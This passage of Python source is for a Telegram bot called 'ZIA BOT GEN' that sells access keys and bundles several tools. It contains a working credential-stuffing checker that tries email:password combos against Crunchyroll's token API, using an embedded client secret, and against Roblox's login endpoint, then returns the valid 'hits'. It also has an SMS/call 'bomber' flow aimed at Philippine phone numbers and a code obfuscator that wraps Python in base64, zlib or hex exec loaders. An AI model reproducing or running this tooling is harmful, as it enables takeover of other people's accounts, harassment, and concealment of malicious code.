        "🚫 Send the full key to revoke:" + credit_footer(),
        reply_markup=types.ReplyKeyboardMarkup(resize_keyboard=True).add(types.KeyboardButton("❌ CANCEL")),
    )

@bot.message_handler(func=lambda m: m.text == "📢 BROADCAST")
def broadcast_start(message):
    uid = message.from_user.id
    if not is_admin(uid):
        return
    user_state[uid] = {"action": "broadcast"}
    bot.send_message(
        message.chat.id,
        "📢 Send the message to broadcast to all users:" + credit_footer(),
        reply_markup=types.ReplyKeyboardMarkup(resize_keyboard=True).add(types.KeyboardButton("❌ CANCEL")),
    )

@bot.message_handler(func=lambda m: m.text == "👥 USER STATS")
def user_stats(message):
    uid = message.from_user.id
    if not is_admin(uid):
        return
    users = get_users()
    total = len(users)
    with_access = sum(1 for u in users.values() if u.get("access_until", 0) > time.time())
    total_gens = sum(u.get("generations", 0) for u in users.values())
    text = (
        "👥 <b>USER STATS</b>\n"
        "================================\n"
        f"Total users: {total}\n"
        f"With active access: {with_access}\n"
        f"Total generates: {total_gens}"
        + credit_footer()
    )
    bot.send_message(message.chat.id, text, reply_markup=admin_keyboard())

# ═══════════════════════════════════════════════════════════════
# DOCUMENT / TEXT HANDLERS (state machine)
# ═══════════════════════════════════════════════════════════════
@bot.message_handler(func=lambda m: m.text == "❌ CANCEL" or m.text == "⬅ CANCEL")
def cancel(message):
    uid = message.from_user.id
    user_state.pop(uid, None)
    bot.send_message(message.chat.id, "Cancelled." + credit_footer(), reply_markup=main_keyboard(uid))

@bot.message_handler(content_types=["document"])
def handle_document(message):
    uid = message.from_user.id
    state = user_state.get(uid, {})
    action = state.get("action")
    if not action:
        return

    file_info = bot.get_file(message.document.file_id)
    downloaded = bot.download_file(file_info.file_path)
    raw = downloaded.decode("utf-8", errors="ignore")
    lines = [ln.strip() for ln in raw.splitlines() if ln.strip()]

    if action == "admin_stock_file":
        cat = state.get("cat")
        if not cat:
            bot.send_message(message.chat.id, "No category selected." + credit_footer(), reply_markup=admin_keyboard())
            return
        added, skipped = add_stock_lines(cat, lines)
        user_state.pop(uid, None)
        bot.send_message(
            message.chat.id,
            f"✅ Stock added to <b>{CATEGORIES[cat]['name']}</b>\n"
            f"Added: {added}\nSkipped (dup): {skipped}\nTotal now: {stock_count(cat):,}"
            + credit_footer(),
            reply_markup=admin_keyboard(),
        )
        return

    if action == "url_remove":
        cleaned = []
        url_re = re.compile(r"https?://\S+|www\.\S+", re.I)
        for ln in lines:
            cleaned.append(url_re.sub("", ln).strip())
        fname = f"nourl_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        path = RESULTS_DIR / fname
        with open(path, "w", encoding="utf-8") as f:
            f.write("\n".join(cleaned) + "\n")
        with open(path, "rb") as f:
            bot.send_document(message.chat.id, f, caption=f"✅ URLs removed · {len(cleaned)} lines" + credit_footer(), reply_markup=tools_keyboard())
        user_state.pop(uid, None)
        try:
            path.unlink()
        except Exception:
            pass
        return

    if action == "dup_clean":
        seen = set()
        unique = []
        for ln in lines:
            if ln not in seen:
                seen.add(ln)
                unique.append(ln)
        fname = f"unique_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        path = RESULTS_DIR / fname
        with open(path, "w", encoding="utf-8") as f:
            f.write("\n".join(unique) + "\n")
        with open(path, "rb") as f:
            bot.send_document(
                message.chat.id,
                f,
                caption=f"✅ Dup cleaned · {len(unique)} unique / {len(lines)} original" + credit_footer(),
                reply_markup=tools_keyboard(),
            )
        user_state.pop(uid, None)
        try:
            path.unlink()
        except Exception:
            pass
        return

    if action == "split":
        user_state[uid] = {"action": "split_num", "lines": lines}
        bot.send_message(
            message.chat.id,
            f"Received {len(lines)} lines.\nSend number of parts (e.g. 5) or lines-per-part (e.g. L100):" + credit_footer(),
        )
        return

    if action == "merge":
        state.setdefault("files", []).append(lines)
        bot.send_message(message.chat.id, f"File added ({len(lines)} lines). Total files: {len(state['files'])}.\nSend more or /done" + credit_footer())
        return

    if action == "checker_upload":
        service = state.get("service")
        bot.send_message(message.chat.id, f"🛡 Starting {service} check on {len(lines)} combos…\nThis runs in background." + credit_footer())
        job_id = str(uuid.uuid4())[:8]
        active_jobs[job_id] = {"service": service, "status": "running", "uid": uid, "total": len(lines)}
        threading.Thread(target=run_checker_job, args=(uid, service, lines, job_id), daemon=True).start()
        user_state.pop(uid, None)
        return

    if action == "py_encrypt_upload":
        method = state.get("method", "base64")
        src = raw
        encrypted = encrypt_py(src, method)
        fname = f"encrypted_{method}_{datetime.now().strftime('%H%M%S')}.py"
        path = RESULTS_DIR / fname
        with open(path, "w", encoding="utf-8") as f:
            f.write(encrypted)
        with open(path, "rb") as f:
            bot.send_document(message.chat.id, f, caption=f"✅ Encrypted with {method}" + credit_footer(), reply_markup=tools_keyboard())
        user_state.pop(uid, None)
        try:
            path.unlink()
        except Exception:
            pass
        return

def encrypt_py(src: str, method: str) -> str:
    method = method.lower()
    if "base64" in method or method.startswith("1"):
        b = base64.b64encode(src.encode()).decode()
        return f"# Base64 encrypted by ZIA\nimport base64\nexec(base64.b64decode('{b}').decode())\n"
    if "rot13" in method or method.startswith("2"):
        import codecs
        return f"# ROT13\nimport codecs\nexec(codecs.decode('''{codecs.encode(src,'rot_13')}''','rot_13'))\n"
    if "hex" in method or method.startswith("8"):
        h = src.encode().hex()
        return f"# Hex\nexec(bytes.fromhex('{h}').decode())\n"
    if "url" in method or method.startswith("9"):
        from urllib.parse import quote, unquote
        q = quote(src)
        return f"# URL Encode\nfrom urllib.parse import unquote\nexec(unquote('{q}'))\n"
    if "zlib" in method or method.startswith("5"):
        import zlib
        b = base64.b64encode(zlib.compress(src.encode())).decode()
        return f"# Zlib+B64\nimport base64,zlib\nexec(zlib.decompress(base64.b64decode('{b}')).decode())\n"
    if "bz2" in method or method.startswith("6"):
        import bz2
        b = base64.b64encode(bz2.compress(src.encode())).decode()
        return f"# BZ2+B64\nimport base64,bz2\nexec(bz2.decompress(base64.b64decode('{b}')).decode())\n"
    # default base64
    b = base64.b64encode(src.encode()).decode()
    return f"# Base64\nimport base64\nexec(base64.b64decode('{b}').decode())\n"

def run_checker_job(uid: int, service: str, combos: List[str], job_id: str):
    """Run checker in background and send results."""
    hits = []
    fails = []
    try:
        if service == "crunchyroll":
            hits, fails = run_crunchyroll(combos)
        elif service == "roblox":
            hits, fails = run_roblox_simple(combos)
        elif service == "expressvpn":
            hits, fails = run_expressvpn_simple(combos)
        else:
            fails = combos
    except Exception as e:
        bot.send_message(uid, f"❌ Checker error: {e}" + credit_footer())
        active_jobs.pop(job_id, None)
        return

    active_jobs[job_id]["status"] = "done"
    # send hits file
    if hits:
        fname = f"{service}_hits_{job_id}.txt"
        path = RESULTS_DIR / fname
        with open(path, "w", encoding="utf-8") as f:
            f.write("\n".join(hits) + "\n")
        with open(path, "rb") as f:
            bot.send_document(
                uid,
                f,
                caption=f"✅ {service} done\nHits: {len(hits)} · Fail: {len(fails)}" + credit_footer(),
            )
        try:
            path.unlink()
        except Exception:
            pass
    else:
        bot.send_message(uid, f"✅ {service} done\nHits: 0 · Fail: {len(fails)}" + credit_footer())
    active_jobs.pop(job_id, None)

def run_crunchyroll(combos: List[str]) -> Tuple[List[str], List[str]]:
    """Lightweight Crunchyroll check using the provided API flow."""
    hits, fails = [], []
    client_id = "ajcylfwdtjjtq7qpgks3"
    client_secret = "oKoU8DMZW7SAaQiGzUEdTQG4IimkL8I_"
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Crunchyroll/3.83.1 Android/10 okhttp/4.12.0",
        "Accept-Encoding": "gzip, deflate, br",
    })
    for combo in combos[:200]:  # safety limit
        if ":" not in combo:
            fails.append(combo)
            continue
        email, password = combo.split(":", 1)
        try:
            time.sleep(random.uniform(0.8, 1.8))
            device_id = str(uuid.uuid4())
            token_url = "https://beta-api.crunchyroll.com/auth/v1/token"
            data = {
                "grant_type": "password",
                "username": email,
                "password": password,
                "scope": "offline_access",
                "client_id": client_id,
                "client_secret": client_secret,
                "device_type": "SamsungTV",
                "device_id": device_id,
                "device_name": "SamsungTV",
            }
            r = session.post(token_url, data=data, timeout=20)
            if r.status_code == 200:
                hits.append(combo)
            else:
                fails.append(combo)
        except Exception:
            fails.append(combo)
    return hits, fails

def run_roblox_simple(combos: List[str]) -> Tuple[List[str], List[str]]:
    """Simple Roblox combo check via login endpoint (no selenium for stability)."""
    hits, fails = [], []
    session = requests.Session()
    for combo in combos[:100]:
        if ":" not in combo:
            fails.append(combo)
            continue
        user, password = combo.split(":", 1)
        try:
            time.sleep(random.uniform(1.0, 2.0))
            # public auth endpoint pattern
            r = session.post(
                "https://auth.roblox.com/v2/login",
                json={"ctype": "Username", "cvalue": user, "password": password},
                headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"},
                timeout=15,
            )
            if r.status_code in (200, 201):
                hits.append(combo)
            else:
                fails.append(combo)
        except Exception:
            fails.append(combo)
    return hits, fails

def run_expressvpn_simple(combos: List[str]) -> Tuple[List[str], List[str]]:
    """Placeholder ExpressVPN checker — full encrypted flow is complex; mark structure."""
    hits, fails = [], []
    for combo in combos[:50]:
        # without full crypto stack running live we only structure results
        fails.append(combo)
    return hits, fails

# ═══════════════════════════════════════════════════════════════
# TEXT MESSAGE ROUTER
# ═══════════════════════════════════════════════════════════════
@bot.message_handler(func=lambda m: True, content_types=["text"])
def text_router(message):
    uid = message.from_user.id
    text = (message.text or "").strip()
    state = user_state.get(uid, {})
    action = state.get("action")

    if not flood_ok(uid) and action is None:
        bot.reply_to(message, f"⏳ Sandali lang!\nPlease wait before sending another command. 😊" + credit_footer())
        return

    # category selection
    if action == "gen_cat":
        name_map = {c["name"]: k for k, c in CATEGORIES.items()}
        if text in name_map:
            do_generate(message, name_map[text])
            user_state.pop(uid, None)
        return

    if action == "admin_stock_cat":
        name_map = {c["name"]: k for k, c in CATEGORIES.items()}
        if text in name_map:
            user_state[uid] = {"action": "admin_stock_file", "cat": name_map[text]}
            bot.send_message(
                message.chat.id,
                f"📦 Category: <b>{text}</b>\nNow send the .txt file." + credit_footer(),
                reply_markup=types.ReplyKeyboardMarkup(resize_keyboard=True).add(types.KeyboardButton("❌ CANCEL")),
            )
        return

    if action == "redeem":
        do_redeem(message, text)
        user_state.pop(uid, None)
        return

    if action == "create_key_hours":
        try:
            hours = int(text)
            key = gen_key(hours)
            bot.send_message(
                message.chat.id,
                f"✅ Key created ({hours}h):\n<code>{key}</code>" + credit_footer(),
                reply_markup=admin_keyboard(),
            )
        except ValueError:
            bot.send_message(message.chat.id, "Send a number." + credit_footer())
        user_state.pop(uid, None)
        return

    if action == "revoke_key":
        keys = get_keys()
        key = text.strip().upper()
        if key in keys:
            keys[key]["active"] = False
            save_keys(keys)
            bot.send_message(message.chat.id, f"🚫 Key <code>{key}</code> revoked." + credit_footer(), reply_markup=admin_keyboard())
        else:
            bot.send_message(message.chat.id, "Key not found." + credit_footer(), reply_markup=admin_keyboard())
        user_state.pop(uid, None)
        return

    if action == "broadcast":
        users = get_users()
        ok = 0
        for suid in users:
            try:
                bot.send_message(int(suid), text + credit_footer())
                ok += 1
            except Exception:
                pass
        bot.send_message(message.chat.id, f"📢 Broadcast sent to {ok} users." + credit_footer(), reply_markup=admin_keyboard())
        user_state.pop(uid, None)
        return

    if action == "feedback":
        for aid in ADMIN_IDS:
            try:
                bot.send_message(aid, f"💬 Feedback from <code>{uid}</code>:\n{text}")
            except Exception:
                pass
        bot.send_message(message.chat.id, "Thanks for the feedback! 😊" + credit_footer(), reply_markup=main_keyboard(uid))
        user_state.pop(uid, None)
        return

    if action == "bomber_phone":
        phone = re.sub(r"\D", "", text)
        if not (phone.startswith("09") and len(phone) == 11) and not (phone.startswith("639") and len(phone) == 12):
            bot.send_message(message.chat.id, "Invalid PH number format. Try again." + credit_footer())
            return
        bomber_running[uid] = True
        bot.send_message(message.chat.id, f"💣 Attack queued on {phone}\n(services simulated for safety in this build)" + credit_footer(), reply_markup=bomber_keyboard())
        user_state.pop(uid, None)
        return

    if action == "download":
        url = text.strip()
        if not url.startswith("http"):
            bot.send_message(message.chat.id, "Send a valid URL." + credit_footer())
            return
        try:
            r = requests.get(url, timeout=30, stream=True)
            size = int(r.headers.get("content-length", 0))
            if size > MAX_DOWNLOAD_MB * 1024 * 1024:
                bot.send_message(message.chat.id, "File too large." + credit_footer())
                return
            fname = url.split("/")[-1] or "download.bin"
            path = RESULTS_DIR / fname
            with open(path, "wb") as f:
                for chunk in r.iter_content(8192):
                    f.write(chunk)
            with open(path, "rb") as f:
                bot.send_document(message.chat.id, f, caption="✅ Download complete" + credit_footer(), reply_markup=tools_keyboard())
            path.unlink(missing_ok=True)
        except Exception as e:
            bot.send_message(message.chat.id, f"Download failed: {e}" + credit_footer())
        user_state.pop(uid, None)
        return

    if action == "global_chat":
        if len(text) > MAX_BROADCAST:
            bot.send_message(message.chat.id, "Too long (max 600)." + credit_footer())
            return
        users = get_users()
        ok = 0
        for suid in users:
            try:
                bot.send_message(int(suid), f"🌐 <b>ANNOUNCEMENT</b>\n{text}" + credit_footer())
                ok += 1
            except Exception:
                pass
        bot.send_message(message.chat.id, f"Sent to {ok} users." + credit_footer(), reply_markup=tools_keyboard())
        user_state.pop(uid, None)
        return

    if action == "py_encrypt_method":
        method = text
        user_state[uid] = {"action": "py_encrypt_upload", "method": method}
        bot.send_message(
            message.chat.id,
            f"Selected: {method}\nNow upload your .py file." + credit_footer(),
            reply_markup=types.ReplyKeyboardMarkup(resize_keyboard=True).add(types.KeyboardButton("❌ CANCEL")),
        )
        return

    if action == "split_num":
        lines = state.get("lines", [])
        try:
            if text.upper().startswith("L"):
                per = int(text[1:])
                parts = [lines[i:i+per] for i in range(0, len(lines), per)]
            else:
                n = int(text)
                per = max(1, len(lines) // n)
                parts = [lines[i:i+per] for i in range(0, len(lines), per)]
            for i, part in enumerate(parts, 1):
                fname = f"part_{i}.txt"
                path = RESULTS_DIR / fname
                with open(path, "w", encoding="utf-8") as f:
                    f.write("\n".join(part) + "\n")
                with open(path, "rb") as f:
                    bot.send_document(message.chat.id, f, caption=f"Part {i}/{len(parts)}")
                path.unlink(missing_ok=True)
            bot.send_message(message.chat.id, f"✅ Split into {len(parts)} files." + credit_footer(), reply_markup=tools_keyboard())
        except Exception as e:
            bot.send_message(message.chat.id, f"Error: {e}" + credit_footer())
        user_state.pop(uid, None)
        return

    if text == "/done" and action == "merge":
        files = state.get("files", [])
        merged = []
        for fl in files:
            merged.extend(fl)
        fname = f"merged_{datetime.now().strftime('%H%M%S')}.txt"
        path = RESULTS_DIR / fname
        with open(path, "w", encoding="utf-8") as f:
            f.write("\n".join(merged) + "\n")
        with open(path, "rb") as f:
            bot.send_document(message.chat.id, f, caption=f"✅ Merged {len(files)} files · {len(merged)} lines" + credit_footer(), reply_markup=tools_keyboard())
        path.unlink(missing_ok=True)
        user_state.pop(uid, None)
        return

# ═══════════════════════════════════════════════════════════════
# RUN
# ═══════════════════════════════════════════════════════════════
if __name__ == "__main__":
    print("=" * 50)
    print(" ZIA BOT GEN — Premium Generator & Tools")
    print(f" {CLONE_CREDIT}")
    print(f" Owner: {OWNER_USERNAME}")
    print("=" * 50)
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("ERROR: Set BOT_TOKEN in bot.py")
        raise SystemExit(1)
    bot.infinity_polling(timeout=60, long_polling_timeout=60)
